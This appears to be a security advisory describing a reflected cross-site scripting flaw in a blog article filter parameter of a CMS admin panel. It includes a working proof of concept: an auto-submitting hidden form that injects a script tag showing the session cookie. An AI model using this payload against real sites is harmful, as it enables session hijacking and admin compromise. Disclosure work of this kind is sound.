Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application.

The vulnerability exists due to failure in the blog items filter module script to properly sanitize user-supplied input in "article_form_filter[name][text]" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/admin.php/content/blog/articles/filter" name="main" >
<input type="hidden" name="article_form_filter[name][text]" value='1"><script>alert(document.cookie)</script>' />
<input type="hidden" name="article_form_filter[is_active]" value="" />
<input type="hidden" name="article_form_filter[text][text]" value="" />
<input type="hidden" name="article_form_filter[created_by]" value="" />
<input type="hidden" name="article_form_filter[created_at]" value="" />
<input type="hidden" name="article_form_filter[updated_at]" value="" />
</form>
<script>
document.main.submit();
</script>
